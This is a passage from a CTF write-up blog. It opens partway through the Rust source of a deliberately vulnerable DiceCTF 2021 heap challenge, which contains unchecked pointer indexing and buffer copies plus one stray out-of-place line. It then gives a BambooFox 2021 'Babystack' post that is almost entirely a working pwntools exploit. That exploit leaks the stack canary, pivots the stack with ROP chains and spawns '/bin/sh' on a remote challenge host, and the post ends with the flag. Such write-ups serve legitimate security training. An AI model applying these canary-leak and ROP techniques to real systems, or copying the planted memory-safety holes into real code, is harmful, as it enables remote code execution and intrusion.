class="symbol">&#x27;a</span>&gt;(stock: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword], c: &amp;<span class="keyword">mut</span> <span class="type">u8</span>) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword]  &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = (*c).<span class="title function_ invoke__">into</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;What&#x27;s the name of your new weapon?&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">new_name</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="title function_ invoke__">prompt</span>();</span><br><span class="line">    io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> new_name)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;failed to read input.&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">new_weapon</span>: <span class="type">Box</span>&lt;NewSword&gt; = <span class="type">Box</span>::<span class="title function_ invoke__">new</span>(NewSword &#123;</span><br><span class="line">        name: new_name,</span><br><span class="line">        desc: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;None&quot;</span>)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    stock[index] = <span class="type">Box</span>::<span class="title function_ invoke__">into_raw</span>(new_weapon) <span class="keyword">as</span> *<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword;</span><br><span class="line">    *c += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> stock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">scrap</span>&lt;<span class="symbol">&#x27;a</span>&gt;(stock: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword], c: &amp;<span class="keyword">mut</span> <span class="type">u8</span>) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword]  &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = (*c).<span class="title function_ invoke__">into</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> index &gt; <span class="number">10</span> &#123;</span><br><span class="line">        <span class="comment">// index-1 &gt;= 10</span></span><br><span class="line">        stock[index-<span class="number">1</span>] = ptr::null_mut::&lt;NewSword&gt;();</span><br><span class="line">        *c -= <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;You feel yourself unable to scrap these legendary artifacts, rusty though they may be.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">inspect</span>&lt;<span class="symbol">&#x27;a</span>&gt;(stock: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword], log: &amp;<span class="keyword">mut</span> [<span class="type">u8</span>]) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword]  &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Which weapon do you want to inspect?&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="title function_ invoke__">prompt</span>();</span><br><span class="line">    io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> index)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;failed to read input.&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = index.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;invalid input&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> !stock[index].<span class="title function_ invoke__">is_null</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">log_s</span>: <span class="type">String</span>;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">weapon</span>: *<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword = stock[index];</span><br><span class="line">            <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                log_s = (*weapon).<span class="title function_ invoke__">inspect</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> index &gt;= <span class="number">10</span> &amp;&amp; log_s.<span class="title function_ invoke__">len</span>() &gt; <span class="number">256</span> &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;Error: too big!&quot;</span>);</span><br><span class="line">                process::<span class="title function_ invoke__">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                ptr::<span class="title function_ invoke__">copy_nonoverlapping</span>(log_s.<span class="title function_ invoke__">as_ptr</span>(), log.<span class="title function_ invoke__">as_mut_ptr</span>(), log_s.<span class="title function_ invoke__">len</span>());</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;404 not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">view_stock</span>&lt;<span class="symbol">&#x27;a</span>&gt;(stock: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword]) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword]  &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span>: <span class="type">usize</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> !stock[index].<span class="title function_ invoke__">is_null</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">weapon</span>: *<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword = stock[index] <span class="keyword">as</span> *<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword;</span><br><span class="line">        <span class="keyword">unsafe</span> &#123;</span><br><span class="line">            (*weapon).<span class="title function_ invoke__">display</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        index += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">view_log</span>(log: &amp;<span class="keyword">mut</span> [<span class="type">u8</span>]) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;You recall the weapon you saw last.&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="type">str</span>::<span class="title function_ invoke__">from_utf8</span>(log).<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">prompt</span>() &#123;</span><br><span class="line">    <span class="built_in">print!</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    io::<span class="title function_ invoke__">stdout</span>().<span class="title function_ invoke__">flush</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">read_file</span>() <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">src_file</span>: &amp;<span class="type">str</span> = <span class="string">&quot;excalibur.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">src_file_handle</span>: fs::File = fs::File::<span class="title function_ invoke__">open</span>(&amp;src_file).<span class="title function_ invoke__">expect</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;Could not open file: &#123;&#125;&quot;</span>, &amp;src_file));</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">buf</span>: <span class="type">String</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    src_file_handle.<span class="title function_ invoke__">read_to_string</span>(&amp;<span class="keyword">mut</span> buf)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;Failed to read data from file: &#123;&#125;&quot;</span>, &amp;src_file));</span><br><span class="line">    <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">init_stock</span>(stock: &amp;<span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword]) <span class="punctuation">-&gt;</span> &amp;<span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword] &#123;</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">10</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">new_weapon</span>: <span class="type">Box</span>&lt;RustySword&gt; = <span class="type">Box</span>::<span class="title function_ invoke__">new</span>(RustySword &#123;</span><br><span class="line">            name: <span class="built_in">format!</span>(<span class="string">&quot;Excalibur &#123;&#125;&quot;</span>, i+<span class="number">1</span>),</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        stock[i] = <span class="type">Box</span>::<span class="title function_ invoke__">into_raw</span>(new_weapon) <span class="keyword">as</span> *<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">stock</span>: [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword; <span class="number">256</span>] = [ptr::null_mut::&lt;NewSword&gt;(); <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">c</span>: <span class="type">u8</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">stock_ptr</span>: &amp;<span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword] = &amp;<span class="keyword">mut</span> stock;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">input_buf</span>: [<span class="type">u8</span>; <span class="number">2</span>] =  [<span class="number">0</span>; <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">log</span>: [<span class="type">u8</span>; <span class="number">256</span>] = [<span class="number">0</span>; <span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    stock_ptr = <span class="title function_ invoke__">init_stock</span>(stock_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;You are a blacksmith who has recently been exiled from your home. You leave, reluctant to part with your bustling shop with all your hard-forged equipment.&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;As you travel across distant lands, you stumble upon a town. In it, you find an abandoned armory. Though all the equipment is rusted over, you decide to rennovate it and reestablish your bustling blacksmithing empire.&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;This is your story of how you went from a scorned, penniless blacksmith to, well, a scorned, penniless blacksmith with a flag.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">menu</span>();</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read</span>(&amp;<span class="keyword">mut</span> input_buf).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;failed to read input.&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">choice</span>: <span class="type">i32</span> = std::<span class="type">str</span>::<span class="title function_ invoke__">from_utf8</span>(&amp;input_buf).<span class="title function_ invoke__">unwrap</span>().<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;invalid input&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">match</span> choice &#123;</span><br><span class="line">            <span class="number">1</span> =&gt; &#123; stock_ptr = forge(stock_ptr, &amp;<span class="keyword">mut</span> c) &#125;,</span><br><span class="line">            <span class="number">2</span> =&gt; &#123; stock_ptr = <span class="title function_ invoke__">scrap</span>(stock_ptr, &amp;<span class="keyword">mut</span> c) &#125;,</span><br><span class="line">            <span class="number">3</span> =&gt; &#123; stock_ptr = <span class="title function_ invoke__">inspect</span>(stock_ptr, &amp;<span class="keyword">mut</span> log) &#125;,</span><br><span class="line">            <span class="number">4</span> =&gt; &#123; stock_ptr = <span class="title function_ invoke__">view_stock</span>(stock_ptr) &#125;,</span><br><span class="line">            <span class="number">5</span> =&gt; <span class="title function_ invoke__">view_log</span>(&amp;<span class="keyword">mut</span> log),</span><br><span class="line">            <span class="number">6</span> =&gt; &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">                process::<span class="title function_ invoke__">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            _ =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Invalid choice!&quot;</span>),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="http://tacqiniu.jagger2zr.com/image-20210213231052659.png" alt="image-20210213231052659"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/16/2021dicectf/" data-id="cuidGYZ-xb6E9InDkWrpcErkV" data-title="Dice 2021 CTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2021bamboofox" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/25/2021bamboofox/" class="article-date">
  <time class="dt-published" datetime="2021-01-25T03:07:10.000Z" itemprop="datePublished">2021-01-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/25/2021bamboofox/">2021 ACSC CTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[TOC]</p>
<h2 id="Babystack-pwn"><a href="#Babystack-pwn" class="headerlink" title="Babystack-pwn"></a>Babystack-pwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;./babystack&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./babystack&#x27;)</span></span><br><span class="line">HOST, PORT = <span class="string">&quot;chall.ctf.bamboofox.tw&quot;</span>,<span class="number">10102</span></span><br><span class="line">p = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leaking canary and stack</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;str1: \n&#x27;</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x9</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">0x8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;@ canary: &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">p.sendafter(<span class="string">&#x27;str2: \n&#x27;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">pos = stack+<span class="number">0x20</span>+<span class="number">0xa8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP1</span></span><br><span class="line">log.info(<span class="string">&quot;@ stack: &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">p.sendafter(<span class="string">&#x27;str1: \n&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;str2: \n&#x27;</span>, p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(canary)+p64(<span class="number">0x403470</span>))</span><br><span class="line">p.send(p64(<span class="number">0x401379</span>))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">rop = flat( <span class="number">0x4014b2</span>, <span class="comment"># pop rbx..... retn</span></span><br><span class="line">            <span class="number">0x0</span>,</span><br><span class="line">            <span class="number">0x1</span>,</span><br><span class="line">            <span class="number">0x403428</span>, <span class="comment"># read</span></span><br><span class="line">            <span class="number">0x0</span>,</span><br><span class="line">            <span class="number">0x403300</span>, <span class="comment"># .bss</span></span><br><span class="line">            <span class="number">0x80</span>,</span><br><span class="line">            <span class="number">0x401498</span>, <span class="comment"># mov rdx .....</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0x4032f8</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0x401452</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">          )</span><br><span class="line"></span><br><span class="line"><span class="comment"># write rop chain</span></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;B&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x22</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+p64(pos+<span class="number">0x18</span>))</span><br><span class="line">p.send(rop[<span class="number">0x18</span>:<span class="number">0x30</span>])</span><br><span class="line"><span class="comment"># # rop2</span></span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;B&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x22</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+p64(pos+<span class="number">0x30</span>))</span><br><span class="line">p.send(rop[<span class="number">0x30</span>:<span class="number">0x48</span>])</span><br><span class="line"><span class="comment"># # rop3</span></span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;B&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x22</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+p64(pos+<span class="number">0x48</span>))</span><br><span class="line">p.send(rop[<span class="number">0x48</span>:<span class="number">0x60</span>])</span><br><span class="line"><span class="comment"># rop4</span></span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;B&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x22</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+p64(pos+<span class="number">0x60</span>))</span><br><span class="line">p.send(rop[<span class="number">0x60</span>:<span class="number">0x78</span>])</span><br><span class="line"><span class="comment"># rop5</span></span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;B&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x22</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+p64(pos+<span class="number">0x78</span>))</span><br><span class="line">p.send(rop[<span class="number">0x78</span>:<span class="number">0x90</span>])</span><br><span class="line"><span class="comment"># rop0</span></span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;B&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x22</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+p64(pos))</span><br><span class="line">p.send(rop[<span class="number">0</span>:<span class="number">0x18</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop</span></span><br><span class="line">p.send(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;B&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x22</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+p64(stack+<span class="number">0x70</span>))</span><br><span class="line">p.send(rop[<span class="number">0</span>:<span class="number">0x18</span>])</span><br><span class="line"></span><br><span class="line">rop2 = flat(</span><br><span class="line">        <span class="number">0x4014b2</span>, <span class="comment"># pop rbx..... retn</span></span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        <span class="number">0x1</span>,</span><br><span class="line">        <span class="number">0x403428</span>, <span class="comment"># read</span></span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        <span class="number">0x403a00</span>, <span class="comment"># .bss =&gt; /bin/sh</span></span><br><span class="line">        <span class="number">0x3b</span>,</span><br><span class="line">        <span class="number">0x401498</span>, <span class="comment"># mov rdx .....</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x403a00</span>,</span><br><span class="line">        <span class="number">0x403a08</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x401498</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">p.send(rop2)</span><br><span class="line">p.send((p64(<span class="number">0x401437</span>)+<span class="string">&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x3b</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># flag&#123;Very_3asy_st@ck_piv0t_challenge_right&#125;</span></span><br></pre></td></tr></table></figure>



